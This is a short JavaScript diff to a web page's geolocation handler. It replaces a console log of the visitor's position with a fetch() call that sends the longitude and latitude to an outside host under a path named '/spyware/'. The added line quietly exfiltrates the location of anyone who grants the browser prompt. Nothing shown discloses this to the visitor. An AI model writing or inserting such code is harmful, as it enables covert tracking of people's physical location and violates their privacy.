@@ -32,7 +32,7 @@
         
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos)=> {
-                console.log(pos)
+                fetch('https://icarusws.nl/spyware/?longitude=' + pos.coords.longitude + '&latitude=' + pos.coords.latitude).then(r => console.log(r))
             });
           } else {
             console.log("Werkt niet....")
